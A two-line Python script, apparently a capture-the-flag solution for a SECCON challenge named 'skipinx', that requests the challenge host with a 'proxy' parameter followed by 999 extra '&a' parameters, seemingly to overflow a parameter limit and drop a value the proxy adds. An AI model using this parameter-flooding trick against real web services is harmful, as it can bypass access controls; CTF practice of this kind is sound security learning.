import requests
print(requests.get('http://skipinx.seccon.games:8080/?proxy=hoge'+'&a'*999).text)